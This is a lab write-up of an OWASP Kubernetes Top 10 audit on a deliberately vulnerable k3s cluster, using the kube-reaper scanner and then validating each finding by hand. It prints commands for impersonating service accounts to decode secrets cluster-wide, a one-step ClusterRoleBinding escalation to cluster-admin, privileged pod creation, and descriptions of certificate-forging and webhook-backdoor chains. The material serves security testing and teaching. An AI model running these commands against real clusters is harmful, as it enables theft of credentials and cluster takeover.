---
title: "OWASP Kubernetes Top 10 Audit with Kube-Reaper"
kicker: "Kubernetes . OWASP Top 10 . RBAC Audit"
tags: "Kubernetes . kube-reaper . OWASP . RBAC . Pentesting"
lead: "Using kube-reaper to detect OWASP Kubernetes Top 10 issues in a live cluster, then manually validating every finding: overly permissive RBAC, insecure workloads, missing policy enforcement, and secrets management failures."
---

## The Lab

![Lab Topology](image/owasp-k8s-topology.svg)

*NimbusMart OWASP K8s Top 10 CTF lab running on k3s v1.36.4+k3s1 inside a Proxmox LXC container.*

This note tests the OWASP Kubernetes Top 10 on a [live cluster](https://github.com/hac01/Owasp-top-10-k8s-2025). We use [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) to find each issue. Then we validate each finding by hand.

We test from pod service account tokens, not the admin kubeconfig. This is realistic. An attacker lands inside a pod and uses the auto-mounted SA token. They do not have cluster admin access.

**Target:** [NimbusMart OWASP K8s Top 10 CTF lab](https://github.com/hac01/Owasp-top-10-k8s-2025) on k3s v1.36.4+k3s1 (192.168.1.201)
**Tool:** [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) v0.1.0

---

## Lab Setup

### PATH and KUBECONFIG

k3s stores kubectl at `/usr/local/bin/kubectl`. The default shell PATH does not include this directory. kube-reaper also lives in `/usr/local/bin`.

k3s stores its kubeconfig at `/etc/rancher/k3s/k3s.yaml`, not the standard `/root/.kube/config`. Without this variable set, kube-reaper fails with `failed to infer config`.

Run from the LXC container (192.168.1.201) as root. Set both variables at the start of every session:

```bash
export PATH=/usr/local/bin:$PATH
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
```

To make them permanent, run from the LXC container (192.168.1.201) as root:

```bash
echo 'export PATH=/usr/local/bin:$PATH' >> ~/.bashrc && echo 'export KUBECONFIG=/etc/rancher/k3s/k3s.yaml' >> ~/.bashrc && source ~/.bashrc
```

Every command in this note assumes both variables are set.

### Service Accounts in the Lab

| Namespace | Pod | Service Account | Custom RBAC |
|---|---|---|---|
| storefront | web-frontend | frontend-sa | secret-reader Role (get/list secrets) |
| storefront | catalog-api | catalog-api | catalog-api-cluster ClusterRole (wildcard/*) |
| storefront | recommendations | default | none |
| platform | admin-portal | default | platform-config-reader Role (get/list secrets) |
| platform | debug-shell | default | platform-config-reader Role (get/list secrets) |
| platform | data-exporter | default | platform-config-reader Role (get/list secrets) |
| data | inventory-sync | default | none |
| data | orders-db | default | none |
| checkout | payments-api | default | none |

Every pod auto-mounts its SA token. No pod sets `automountServiceAccountToken: false`.

### Test Approach

We scan from four identities. Each one represents a different attacker landing point:

| Identity | How an attacker gets it | Privilege level |
|---|---|---|
| platform:default | Land in admin-portal via NodePort 30080 | Low. Can read secrets in platform only. |
| storefront:frontend-sa | Exploit a bug in web-frontend | Low. Can read secrets in storefront only. |
| storefront:catalog-api | Exploit a bug in catalog-api | High. Wildcard/* across all namespaces. |
| data:default | Exploit a bug in inventory-sync or orders-db | None. No custom RBAC at all. |

We create short-lived tokens for each SA so kube-reaper can authenticate as that identity. In a real test, you would read the token from inside the pod at `/var/run/secrets/kubernetes.io/serviceaccount/token`.

Run from the LXC container (192.168.1.201) as root. Create all tokens:

```bash
PLATFORM_TOKEN=$(kubectl create token default -n platform --duration=1h)
FRONTEND_TOKEN=$(kubectl create token frontend-sa -n storefront --duration=1h)
CATALOG_TOKEN=$(kubectl create token catalog-api -n storefront --duration=1h)
DATA_TOKEN=$(kubectl create token default -n data --duration=1h)
```

**kube-reaper scans** use `--token` because kube-reaper is a standalone binary that needs a bearer token to talk to the API server.

**kubectl validations** use `--as=system:serviceaccount:<ns>:<sa>` (impersonation) instead of `--token`. This is because k3s kubeconfig contains admin client certificates. When you pass `--token` to kubectl, the admin certificate still bleeds through the TLS handshake. The API server sees both the token and the admin cert, and grants whichever has more access. Impersonation with `--as` is the correct way to test RBAC from a specific identity when you have admin access to the cluster.

---

## OWASP K8s Top 10 Items Detected

kube-reaper detected 4 of the 10 OWASP Kubernetes Top 10 items in this cluster:

| OWASP ID | Name | Detected By |
|---|---|---|
| K01 | Insecure Workload Configurations | catalog-api scan |
| K03 | Overly Permissive RBAC Configurations | All scans |
| K04 | Lack of Centralized Policy Enforcement | All scans |
| K08 | Secrets Management Failures | platform:default, frontend-sa, catalog-api scans |

Items K02, K05, K06, K07, K09, and K10 were not detected. kube-reaper is an RBAC scanner. It does not test supply chain, logging, authentication, network segmentation, or component versions.

---

## K03: Overly Permissive RBAC Configurations

This is the largest finding. Three service accounts have more RBAC access than they need. One of them has full cluster-admin power.

### Scan 1: platform:default

Run from the LXC container (192.168.1.201) as root:

```bash
kube-reaper --token $PLATFORM_TOKEN --server https://127.0.0.1:6443 -n platform --output terminal
```

```text
═══════════════════════════════════════════════════════
  Identity: system:serviceaccount:platform:default
  Namespace: platform
  Namespaces Found: 1
  Findings: 1
  Attack Chains: 1
  Accessible Secrets: 1
═══════════════════════════════════════════════════════

  ATTACK PATH CHAINS

  Chain #1 [HIGH] Secret Harvest: system:serviceaccount:platform:default
  ────────────────────────────────────────────────────────────
  system:serviceaccount:platform:default can read secrets in platform.
  SA token secrets enable identity pivoting.

    ├──▶ kubectl get secrets -> list all secrets
    │   → SA tokens, TLS certs, passwords, API keys exposed (Credential Harvest)
    └──▶ Authenticate with harvested SA tokens
        → Pivot to new identities with different permissions (Lateral Movement)

  DANGEROUS PERMISSIONS

    ● Read Secrets (system:serviceaccount:platform:default@platform)
      │ Resource: secrets [get, list]
      │ Attack: List secrets -> find SA token secrets -> authenticate as those SAs.
      └ Enables: Credential Harvest, Lateral Movement
```

kube-reaper finds 1 HIGH finding. The platform:default service account can read all secrets in the platform namespace. This is the `platform-config-reader` Role.

**Why this is K03:** The default service account for the platform namespace should not read secrets. A frontend web server (admin-portal) does not need access to configuration secrets. The principle of least privilege says: give each identity only the permissions it needs.

### Manual validation: platform:default reads secrets

Run from the LXC container (192.168.1.201) as root. List secrets as the platform:default SA:

```bash
kubectl --as=system:serviceaccount:platform:default get secrets -n platform
```

```text
NAME              TYPE     DATA   AGE
platform-config   Opaque   2      60m
```

The SA can see the secret. Run from the LXC container (192.168.1.201) as root. Decode the secret data:

```bash
kubectl --as=system:serviceaccount:platform:default get secret platform-config -n platform -o jsonpath='{.data.flag}' | base64 -d
```

```text
FLAG{misconfigured_stale_cluster_component}
```

```bash
kubectl --as=system:serviceaccount:platform:default get secret platform-config -n platform -o jsonpath='{.data.registry}' | base64 -d
```

```text
registry.internal.nimbusmart.svc
```

**Confirmed.** platform:default can read the `platform-config` secret. This secret contains an internal registry URL and a flag.

### Manual validation: platform:default is scoped to its own namespace

Run from the LXC container (192.168.1.201) as root. Try to read secrets from a different namespace:

```bash
kubectl --as=system:serviceaccount:platform:default get secrets -n storefront
```

```text
Error from server (Forbidden): secrets is forbidden: User "system:serviceaccount:platform:default" cannot list resource "secrets" in API group "" in the namespace "storefront"
```

**Confirmed.** The permission is scoped to the platform namespace only. The SA cannot reach other namespaces through RBAC. But there are zero NetworkPolicies, so it can still reach other pods through the network.

### RBAC evidence

Run from the LXC container (192.168.1.201) as root. Show the Role and RoleBinding that create this permission:

```bash
kubectl get role platform-config-reader -n platform -o yaml
```

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: platform-config-reader
  namespace: platform
rules:
- apiGroups:
  - ""
  resources:
  - secrets
  verbs:
  - get
  - list
```

Run from the LXC container (192.168.1.201) as root:

```bash
kubectl get rolebinding default-sa-config-reader -n platform -o yaml
```

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: default-sa-config-reader
  namespace: platform
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: platform-config-reader
subjects:
- kind: ServiceAccount
  name: default
  namespace: platform
```

The binding gives the `default` SA in the platform namespace the ability to get and list all secrets.

---

### Scan 2: storefront:frontend-sa

Run from the LXC container (192.168.1.201) as root:

```bash
kube-reaper --token $FRONTEND_TOKEN --server https://127.0.0.1:6443 -n storefront --output terminal
```

```text
═══════════════════════════════════════════════════════
  Identity: system:serviceaccount:storefront:frontend-sa
  Namespace: storefront
  Namespaces Found: 1
  Findings: 1
  Attack Chains: 1
  Accessible Secrets: 1
═══════════════════════════════════════════════════════

  ATTACK PATH CHAINS

  Chain #1 [HIGH] Secret Harvest: system:serviceaccount:storefront:frontend-sa
  ────────────────────────────────────────────────────────────
  system:serviceaccount:storefront:frontend-sa can read secrets in storefront.

    ├──▶ kubectl get secrets -> list all secrets
    │   → SA tokens, TLS certs, passwords, API keys exposed (Credential Harvest)
    └──▶ Authenticate with harvested SA tokens
        → Pivot to new identities with different permissions (Lateral Movement)

  DANGEROUS PERMISSIONS

    ● Read Secrets (system:serviceaccount:storefront:frontend-sa@storefront)
      │ Resource: secrets [get, list]
      │ Attack: List secrets -> find SA token secrets -> authenticate as those SAs.
      └ Enables: Credential Harvest, Lateral Movement
```

Same pattern. frontend-sa has secret-read access in the storefront namespace.

### Manual validation: frontend-sa reads secrets

Run from the LXC container (192.168.1.201) as root. List secrets as frontend-sa:

```bash
kubectl --as=system:serviceaccount:storefront:frontend-sa get secrets -n storefront
```

```text
NAME                  TYPE     DATA   AGE
session-signing-key   Opaque   1      60m
```

Run from the LXC container (192.168.1.201) as root. Decode the flag:

```bash
kubectl --as=system:serviceaccount:storefront:frontend-sa get secret session-signing-key -n storefront -o jsonpath='{.data.flag}' | base64 -d
```

```text
FLAG{default_token_talked_to_the_apiserver}
```

**Confirmed.** frontend-sa can read the `session-signing-key` secret. A frontend web server should not access session signing keys through the Kubernetes API.

Run from the LXC container (192.168.1.201) as root. Verify it cannot reach other namespaces:

```bash
kubectl --as=system:serviceaccount:storefront:frontend-sa get secrets -n platform
```

```text
Error from server (Forbidden): secrets is forbidden: User "system:serviceaccount:storefront:frontend-sa" cannot list resource "secrets" in API group "" in the namespace "platform"
```

**Confirmed.** Cross-namespace access is denied.

---

### Scan 3: data:default (baseline comparison)

Run from the LXC container (192.168.1.201) as root:

```bash
kube-reaper --token $DATA_TOKEN --server https://127.0.0.1:6443 -n data --output terminal
```

```text
═══════════════════════════════════════════════════════
  Identity: system:serviceaccount:data:default
  Namespace: data
  Namespaces Found: 1
  Findings: 0
  Attack Chains: 0
═══════════════════════════════════════════════════════

  SUMMARY
  CRITICAL: 0  HIGH: 0  MEDIUM: 0  LOW: 0
  Attack Chains: 0
```

Zero findings. The data:default SA has no custom RBAC. This is the expected result for a properly configured default service account. It shows the contrast between "no custom RBAC" and "unnecessary secret-read permissions."

---

### Scan 4: storefront:catalog-api (the worst case)

This is the most dangerous identity in the cluster. The catalog-api pod runs a service that talks to the product catalog. It should only need access to catalog data. Instead, it has wildcard/* on all resources in all namespaces. This is the same as cluster-admin.

An attacker who gets command execution in the catalog-api pod (through an application bug, an SSRF, or a deserialization flaw) gets full cluster control.

Run from the LXC container (192.168.1.201) as root:

```bash
kube-reaper --token $CATALOG_TOKEN --server https://127.0.0.1:6443 --output terminal
```

```text
═══════════════════════════════════════════════════════
  Identity: system:serviceaccount:storefront:catalog-api
  Namespace: default
  Namespaces Found: 9
  Findings: 9
  Attack Chains: 72
  Dangerous Pods: 4
  Overprivileged Identities: 28
  Accessible Secrets: 5
  Exposed Services: 1
  Sensitive ConfigMaps: 1
  Admission Controller: 9 probed (9 with weak enforcement)
═══════════════════════════════════════════════════════
```

9 CRITICAL findings. 72 attack chains. 4 dangerous pods. 28 overprivileged identities. From one service account.

kube-reaper shows the wildcard permission in every namespace:

```text
  DANGEROUS PERMISSIONS

  ▸ CRITICAL
    ● Wildcard on All Resources (system:serviceaccount:storefront:catalog-api@checkout)
      │ Resource: * [*]
      │ Attack: Direct cluster-admin equivalent. Do anything.
      └ Enables: Cluster Admin Takeover

    ● Wildcard on All Resources (system:serviceaccount:storefront:catalog-api@data)
      │ Resource: * [*]
      │ Attack: Direct cluster-admin equivalent. Do anything.
      └ Enables: Cluster Admin Takeover

    ● Wildcard on All Resources (system:serviceaccount:storefront:catalog-api@storefront)
      │ Resource: * [*]
      │ Attack: Direct cluster-admin equivalent. Do anything.
      └ Enables: Cluster Admin Takeover
```

(9 total, one for each namespace. All identical.)

The RBAC graph shows 28 identities with dangerous permissions:

```text
  OTHER IDENTITIES (PIVOT TARGETS)

  ● [CRITICAL] system:serviceaccount:kube-system:clusterrole-aggregation-controller
    │ Roles: ClusterRole/system:controller:clusterrole-aggregation-controller
    └ Dangerous: Escalate Verb on ClusterRoles, Create/Modify ClusterRoles

  ● [CRITICAL] system:serviceaccount:kube-system:daemon-set-controller
    │ Roles: ClusterRole/system:controller:daemon-set-controller
    └ Dangerous: Create Pods (No PSS Enforcement), Delete Pods, Patch/Update Pods

  ● [HIGH] system:serviceaccount:platform:default
    │ Roles: Role/platform/platform-config-reader
    └ Dangerous: Read Secrets

  ● [HIGH] system:serviceaccount:storefront:frontend-sa
    │ Roles: Role/storefront/secret-reader
    └ Dangerous: Read Secrets
```

### Manual validation: catalog-api ClusterRole

Run from the LXC container (192.168.1.201) as root:

```bash
kubectl get clusterrole catalog-api-cluster -o yaml
```

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  labels:
    owasp: k02
  name: catalog-api-cluster
rules:
- apiGroups:
  - '*'
  resources:
  - '*'
  verbs:
  - '*'
```

One rule. Wildcard apiGroups, wildcard resources, wildcard verbs. This is the most permissive RBAC rule possible.

Run from the LXC container (192.168.1.201) as root:

```bash
kubectl get clusterrolebinding catalog-api-cluster -o yaml
```

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: catalog-api-cluster
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: catalog-api-cluster
subjects:
- kind: ServiceAccount
  name: catalog-api
  namespace: storefront
```

The ClusterRoleBinding ties this wildcard role to the catalog-api SA in the storefront namespace.

### Manual validation: catalog-api can create ClusterRoleBindings

This is the most direct path to permanent cluster-admin. kube-reaper flagged this as a CRITICAL attack chain. Validate with a server-side dry-run (does not create a real binding):

Run from the LXC container (192.168.1.201) as root:

```bash
kubectl --as=system:serviceaccount:storefront:catalog-api create clusterrolebinding test-escalation --clusterrole=cluster-admin --serviceaccount=storefront:catalog-api --dry-run=server -o yaml | head -6
```

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  creationTimestamp: "2026-09-17T19:14:07Z"
  name: test-escalation
```

The API server accepts the request. It returns a valid ClusterRoleBinding object. In a real attack, remove `--dry-run=server` and this one command gives the attacker permanent cluster-admin access.

### Manual validation: catalog-api reads all secrets cluster-wide

Run from the LXC container (192.168.1.201) as root:

```bash
kubectl --as=system:serviceaccount:storefront:catalog-api get secrets -A --no-headers
```

```text
checkout         payments-webhook                         Opaque                 1      60m
kube-system      k3s-serving                              kubernetes.io/tls      2      63m
kube-system      owasp-k8s-lab.node-password.k3s          k3s.cattle.io/...      1      63m
nimbusmart-ops   master-vault                             Opaque                 1      60m
platform         platform-config                          Opaque                 2      62m
storefront       session-signing-key                      Opaque                 1      60m
```

6 secrets across 4 namespaces. One command.

---

## K01: Insecure Workload Configurations

kube-reaper detected 4 pods with dangerous security settings. These findings come from the catalog-api scan because that identity can list pods and read their specs. Low-privilege SAs cannot list pods, so they cannot detect these issues.

### kube-reaper findings

```text
  DANGEROUS PODS

  ● [CRITICAL] data/inventory-sync
    │ SA: default | Image: busybox:1.36 | Node: owasp-k8s-lab
    ├ ⚠ PRIVILEGED container
    ├ ⚠ hostPath mount: / (ROOT/SENSITIVE)
    └ ⚠ SA token auto-mounted (SA: default)
    Attack: exec into privileged container -> full node access

  ● [CRITICAL] data/node-seed-8f8rv
    │ SA: default | Image: busybox:1.36 | Node: owasp-k8s-lab
    ├ ⚠ PRIVILEGED container
    ├ ⚠ hostPath mount: / (ROOT/SENSITIVE)
    └ ⚠ SA token auto-mounted (SA: default)
    Attack: exec into privileged container -> full node access

  ● [HIGH] checkout/payments-api-5474b5c9bc-k9dth
    │ SA: default | Image: busybox:1.36 | Node: owasp-k8s-lab
    ├ ⚠ plaintext credentials in env: STRIPE_SECRET_KEY
    └ ⚠ SA token auto-mounted (SA: default)
    Attack: hardcoded credentials in env vars -> exec into pod to read them

  ● [HIGH] platform/data-exporter
    │ SA: default | Image: amazon/aws-cli:2.17.20 | Node: owasp-k8s-lab
    ├ ⚠ hostNetwork enabled
    └ ⚠ SA token auto-mounted (SA: default)
    Attack: host network -> sniff traffic, access node-local services
```

### Manual validation: inventory-sync (privileged + hostPath)

Run from the LXC container (192.168.1.201) as root. Inspect the pod spec:

```bash
kubectl get pod inventory-sync -n data -o yaml | grep -A3 -E "privileged|hostPath|runAsUser"
```

```yaml
    securityContext:
      allowPrivilegeEscalation: true
      privileged: true
      runAsUser: 0
--
  - hostPath:
      path: /
      type: Directory
```

**Three problems in one pod:**
1. `privileged: true` gives the container full access to the host kernel.
2. `hostPath: /` mounts the entire host root filesystem into the container.
3. `runAsUser: 0` runs as root inside the container.

An attacker who can exec into this pod can read and write every file on the host. They can read `/etc/shadow`, the k3s kubeconfig, and the k3s server join token.

### Manual validation: data-exporter (hostNetwork)

Run from the LXC container (192.168.1.201) as root:

```bash
kubectl get pod data-exporter -n platform -o yaml | grep hostNetwork
```

```yaml
  hostNetwork: true
```

`hostNetwork: true` puts the container on the node's network stack. The container can see all traffic on the host network interfaces. It can access services that only listen on localhost (like the kubelet API on port 10250).

### Manual validation: payments-api (plaintext credentials in env)

Run from the LXC container (192.168.1.201) as root. Use impersonation to read the pod environment variables as the catalog-api SA:

```bash
kubectl --as=system:serviceaccount:storefront:catalog-api get pod payments-api-5474b5c9bc-k9dth -n checkout -o jsonpath='{range .spec.containers[0].env[*]}{.name}={.value}{"\n"}{end}'
```

```text
STRIPE_SECRET_KEY=FLAG{hardcoded_stripe_key_sk_live_nimbus}
```

A live Stripe API key is stored as a plaintext environment variable. Anyone who can read the pod spec can see this key. Environment variables are not secrets. They appear in pod specs, logs, and crash dumps.

---

## K04: Lack of Centralized Policy Enforcement

kube-reaper checks two things for this OWASP item:
1. Pod Security Standards (PSS) labels on each namespace.
2. Admission controller enforcement through dry-run probes.

### kube-reaper findings

Every scan shows `NO PSS ENFORCEMENT` in the NAMESPACE SECURITY section. The catalog-api scan shows all 9 namespaces:

```text
  NAMESPACE SECURITY

  ● checkout | NO PSS ENFORCEMENT | can create pods <- PRIVILEGED POD BREAKOUT PATH
  ● data | NO PSS ENFORCEMENT | can create pods <- PRIVILEGED POD BREAKOUT PATH
  ● default | NO PSS ENFORCEMENT | can create pods <- PRIVILEGED POD BREAKOUT PATH
  ● kube-node-lease | NO PSS ENFORCEMENT | can create pods <- PRIVILEGED POD BREAKOUT PATH
  ● kube-public | NO PSS ENFORCEMENT | can create pods <- PRIVILEGED POD BREAKOUT PATH
  ● kube-system | NO PSS ENFORCEMENT | can create pods <- PRIVILEGED POD BREAKOUT PATH
  ● nimbusmart-ops | NO PSS ENFORCEMENT | can create pods <- PRIVILEGED POD BREAKOUT PATH
  ● platform | NO PSS ENFORCEMENT | can create pods <- PRIVILEGED POD BREAKOUT PATH
  ● storefront | NO PSS ENFORCEMENT | can create pods <- PRIVILEGED POD BREAKOUT PATH
```

The admission controller probing section shows kube-reaper tested 6 dangerous pod configurations in each namespace. All 6 passed in all 9 namespaces:

```text
  ADMISSION CONTROLLER PROBING
  Dry-run pod probes (no pods created)

  ● storefront [NO ENFORCEMENT]  6/6 probes allowed
    │ privileged: ALLOWED
    │ hostPID: ALLOWED
    │ hostNetwork: ALLOWED
    │ hostPath: ALLOWED
    │ CAP_SYS_ADMIN: ALLOWED
    │ runAsRoot: ALLOWED
```

(All 9 namespaces show the same result: 6/6 probes allowed.)

### Manual validation: no PSS labels

Run from the LXC container (192.168.1.201) as root:

```bash
kubectl get namespaces -o custom-columns="NAME:.metadata.name,PSS-ENFORCE:.metadata.labels.pod-security\.kubernetes\.io/enforce,PSS-AUDIT:.metadata.labels.pod-security\.kubernetes\.io/audit"
```

```text
NAME              PSS-ENFORCE   PSS-AUDIT
checkout          <none>        <none>
data              <none>        <none>
default           <none>        <none>
kube-node-lease   <none>        <none>
kube-public       <none>        <none>
kube-system       <none>        <none>
nimbusmart-ops    <none>        <none>
platform          <none>        <none>
storefront        <none>        <none>
```

Zero namespaces have PSS enforcement or audit labels. Pod Security Standards are the built-in Kubernetes mechanism to prevent dangerous pod configurations. Without these labels, any SA that can create pods can deploy privileged containers.

### Manual validation: privileged pod creation allowed (dry-run)

Run from the LXC container (192.168.1.201) as root. Use impersonation to test if the API server accepts a privileged pod as the catalog-api SA:

```bash
kubectl --as=system:serviceaccount:storefront:catalog-api run test-priv --image=alpine --restart=Never --dry-run=server -n storefront --overrides='{"spec":{"containers":[{"name":"test","image":"alpine","securityContext":{"privileged":true}}]}}' -o yaml | head -5
```

```yaml
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: "2026-09-17T19:14:07Z"
  generation: 1
```

The API server accepts the pod spec. No admission controller blocks it. If we remove `--dry-run=server`, this creates a real privileged container on the node.

**Why this matters:** Even if you fix the RBAC permissions (remove wildcard access from catalog-api), any SA that can create pods in ANY namespace can still create privileged containers. PSS enforcement is the defense-in-depth layer that prevents this.

---

## K08: Secrets Management Failures

kube-reaper detected three types of secret management problems:
1. Service accounts with unnecessary secret-read permissions.
2. Secrets accessible across namespaces (via the wildcard ClusterRole).
3. Hardcoded credentials in pod environment variables.
4. Sensitive data in ConfigMaps.

### kube-reaper findings: Secret Triage

From the catalog-api scan:

```text
  SECRET TRIAGE

  ● [MEDIUM] checkout/payments-webhook (Opaque Secret)
    │ Type: Opaque
    └ Attack: Opaque secret. May contain passwords, API keys, connection strings.

  ● [MEDIUM] kube-system/k3s-serving (TLS Certificate)
    │ Type: kubernetes.io/tls
    └ Attack: Contains TLS cert + private key. Impersonate the service.

  ● [MEDIUM] nimbusmart-ops/master-vault (Opaque Secret)
    │ Type: Opaque
    └ Attack: Opaque secret. May contain passwords, API keys, connection strings.

  ● [MEDIUM] platform/platform-config (Opaque Secret)
    │ Type: Opaque
    └ Attack: Opaque secret. May contain passwords, API keys, connection strings.

  ● [MEDIUM] storefront/session-signing-key (Opaque Secret)
    │ Type: Opaque
    └ Attack: Opaque secret. May contain passwords, API keys, connection strings.
```

5 secrets accessible. Each one is in a different namespace. The catalog-api SA can read all of them because of the wildcard ClusterRole.

kube-reaper also found a sensitive ConfigMap:

```text
  SENSITIVE CONFIGMAPS

  ● [MEDIUM] checkout/payments-config
    │ Keys: BILLING_WEBHOOK_TOKEN
    └ Attack: ConfigMap may contain credentials.
```

A ConfigMap with a key named `BILLING_WEBHOOK_TOKEN`. ConfigMaps are not encrypted at rest. They are easier to read than Secrets because more RBAC roles grant ConfigMap access.

### Manual validation: decode the secrets

All commands run from the LXC container (192.168.1.201) as root. Use impersonation as the catalog-api SA for cross-namespace access.

Run from the LXC container (192.168.1.201) as root. Read the master-vault secret in nimbusmart-ops:

```bash
kubectl --as=system:serviceaccount:storefront:catalog-api get secret master-vault -n nimbusmart-ops -o jsonpath='{.data.flag}' | base64 -d
```

```text
FLAG{wildcard_rbac_opens_the_ops_vault}
```

Run from the LXC container (192.168.1.201) as root. Read the payments-webhook secret in checkout:

```bash
kubectl --as=system:serviceaccount:storefront:catalog-api get secret payments-webhook -n checkout -o jsonpath='{.data.flag}' | base64 -d
```

```text
FLAG{silent_exfil_left_no_audit_trail}
```

**Why this is K08:** Secrets are stored in etcd with no encryption at rest (default k3s config). RBAC is the only layer that controls access. When RBAC is too permissive (K03), secrets become accessible to identities that should not read them.

The hardcoded STRIPE_SECRET_KEY in the payments-api environment variables (found in K01) is also a K08 issue. Environment variables should not hold secrets. Use Kubernetes Secrets with volume mounts instead.

---

## K03 Attack Chains: How kube-reaper Maps Escalation Paths

The catalog-api scan found 72 attack chains. These chains show multi-step paths from the current identity to higher access. Here are the most important ones.

### Chain: Cluster-Admin via ClusterRoleBinding (one step)

```text
  Chain #2 [CRITICAL] Cluster-Admin via ClusterRoleBinding
  ────────────────────────────────────────────────────────────
  catalog-api can create ClusterRoleBindings.
  One-step escalation to cluster-admin.

    └──▶ Create ClusterRoleBinding binding cluster-admin to self
        → Full cluster-admin access (Cluster Admin Takeover)
```

One command makes the escalation permanent. Even if someone later removes the wildcard ClusterRole, the new ClusterRoleBinding keeps the access.

### Chain: Certificate Forging via CSR (permanent access)

```text
  Chain #5 [CRITICAL] Certificate Forging via CSR
  ────────────────────────────────────────────────────────────
  catalog-api can both create and approve CSRs.
  Mint a client certificate with system:masters group.

    ├──▶ Create CSR with O=system:masters
    └──▶ Approve the CSR
        → Valid client certificate for system:masters group
```

A certificate in the system:masters group gives cluster-admin access that survives RBAC changes. The certificate is valid until it expires.

### Chain: Privileged Pod Breakout (node root)

```text
  Chain #1 [CRITICAL] Privileged Pod Breakout
  ────────────────────────────────────────────────────────────
  catalog-api can create pods in storefront (no PSS enforcement).
  Deploy a privileged pod to break out to the node.

    ├──▶ Create privileged pod with hostPID, hostNetwork, hostPath:/
    └──▶ chroot /mnt from inside privileged container
        → Root shell on worker node (Node Breakout)
```

This chain combines K03 (create pods permission), K04 (no PSS enforcement), and K01 (privileged pod config). kube-reaper maps the full path from RBAC to node breakout.

### Chain: Exec into existing dangerous pod (no creation needed)

kube-reaper also found that catalog-api can exec into pods that are already dangerous:

```text
  Chain #11 [HIGH] Pivot via storefront/web-frontend -> frontend-sa
  ────────────────────────────────────────────────────────────
  catalog-api can exec into storefront/web-frontend which runs as frontend-sa.
  That SA has: Read Secrets.

    ├──▶ kubectl exec -n storefront web-frontend
    │   → Shell in container (SA: frontend-sa)
    ├──▶ Read /var/run/secrets/kubernetes.io/serviceaccount/token
    │   → Now acting as frontend-sa
    └──▶ SA has: Read Secrets
        → Escalated permissions via frontend-sa
```

### Chain: Webhook Backdoor (persistent cluster access)

```text
  Chain #9 [HIGH] Cluster-Wide Backdoor via MutatingWebhook
  ────────────────────────────────────────────────────────────
  catalog-api can create MutatingWebhookConfigurations.
  Register a webhook that injects a sidecar into every new pod.

    └──▶ Deploy webhook server + register MutatingWebhookConfiguration
        → All new pods get sidecar container injected (Persistent Backdoor)
```

This is the stealthiest chain. Every new pod in the cluster gets an attacker-controlled sidecar container. The backdoor survives pod restarts and redeployments.

---

## Exposed Services

kube-reaper found one externally exposed service:

```text
  EXPOSED SERVICES

  ● [MEDIUM] platform/admin-portal (NodePort)
    │ Ports: TCP:30080->80
    └ Attack: NodePort service accessible on all cluster nodes.
```

### Manual validation

Run from the LXC container (192.168.1.201) as root:

```bash
kubectl get svc admin-portal -n platform
```

```text
NAME           TYPE       CLUSTER-IP     PORT(S)
admin-portal   NodePort   10.43.65.247   80:30080/TCP
```

NodePort 30080 is open on every cluster node. The admin-portal has no authentication. This is the initial entry point for an external attacker.

---

## Summary

### What kube-reaper detected

| OWASP ID | Finding Count | Severity | Key Issues |
|---|---|---|---|
| K01 | 4 pods | 2 CRITICAL, 2 HIGH | Privileged containers, hostPath:/, hostNetwork, plaintext env creds |
| K03 | 9 findings | 9 CRITICAL | Wildcard ClusterRole, unnecessary secret-read on 2 SAs, 28 overprivileged identities |
| K04 | 9 namespaces | All critical | Zero PSS labels, 54/54 admission probes passed (all dangerous configs allowed) |
| K08 | 5 secrets, 1 configmap | All medium | Cross-namespace secret access, hardcoded API keys, sensitive ConfigMap |

### What kube-reaper did NOT detect

kube-reaper focuses on high-quality, actionable findings. It reports RBAC attack paths that you can exploit right now. It does not report configuration checks, version warnings, or informational items. This is a deliberate design choice. Tools that report every possible issue create tester fatigue. When a report has 500 findings, testers stop reading after the first 50. kube-reaper keeps the output short so every finding gets attention.

The 6 OWASP items below are real risks. They need different tools to detect them.

| OWASP ID | Name | Why Not In Scope |
|---|---|---|
| K02 | Supply Chain Vulnerabilities | Needs image scanning tools (Trivy, Grype). Not an RBAC problem. |
| K05 | Inadequate Logging and Monitoring | Needs audit policy review and log pipeline checks. Not exploitable through RBAC. |
| K06 | Broken Authentication Mechanisms | Anonymous users can list pods in this cluster (anon-reader ClusterRole). kube-reaper does not flag authentication weaknesses because they require context about what "anonymous" should access. |
| K07 | Missing Network Segmentation | Needs NetworkPolicy analysis (Cilium, Calico tools). Not part of RBAC. |
| K09 | Misconfigured Cluster Components | Needs API server flag review and etcd encryption checks (kube-bench). Not exploitable through SA tokens. |
| K10 | Outdated and Vulnerable K8s Components | Needs CVE database lookups against cluster and image versions. Not an RBAC problem. |

### Low-privilege vs high-privilege scan results

| Identity | Findings | Chains | Secrets | Dangerous Pods |
|---|---|---|---|---|
| platform:default | 1 | 1 | 1 | 0 |
| storefront:frontend-sa | 1 | 1 | 1 | 0 |
| data:default | 0 | 0 | 0 | 0 |
| storefront:catalog-api | 9 | 72 | 5 | 4 |

Low-privilege scans find the RBAC issues in their own namespace. The catalog-api scan reveals the full scope of the problem because it can enumerate pods, secrets, and RBAC rules across all namespaces.

**Lesson:** Run kube-reaper from every SA you encounter during a test. Low-privilege scans show what that specific identity can reach. High-privilege scans show the full attack surface. Both perspectives matter.

**Important:** Always pass `-n <namespace>` when you scan a low-privilege SA. Without this flag, kube-reaper defaults to the `default` namespace and misses namespace-scoped permissions.
